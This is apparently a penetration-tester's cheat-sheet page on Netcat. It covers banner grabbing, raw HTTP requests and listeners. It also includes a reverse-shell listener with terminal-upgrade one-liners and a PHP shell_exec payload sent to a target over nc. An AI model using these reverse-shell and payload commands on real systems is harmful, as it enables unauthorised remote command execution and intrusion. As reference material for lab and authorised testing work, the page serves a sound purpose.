---
title: Netcat
desc: Manages network connections. Also known as 'nc'.
tags: [ActiveRecon, Linux, Network, PrivEsc, ReverseShell, SMTP, Web]
alts: [Ncat, Telnet]
website:
render_with_liquid: false
---

## Useful Commands

```sh
# Banner Grabbing
nc 10.0.0.1 21
nc 10.0.0.1 22
```

<br />

## HTTP request

```sh
echo -en "GET / HTTP/1.1\nhost: netcat\n\n" | nc 10.10.44.191 80
```

<br />

## Listen

```sh
# HTTP
nc -lvnp 80

# HTTPS
nc -lvnp 443
```

<br />

## Listen (background)

```sh
# Add '&'
nc -lvnp 4444 &
```

<br />

## Listen for Reverse Shell

```sh
nc -lvnp 4444

# ---- Activate -------------------------

# Interactive shell
/bin/bash -i

# Upgrade to fully functional terminal
$ SHELL=/bin/bash script -q /dev/null
# or
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<br />

## PHP Shell

```sh
nc <target-ip> 80
<?php echo shell_exec('whoami') ?>
```

<br />

## SMTP Banner Grabbing

```sh
nc -vn <target-ip> 25
```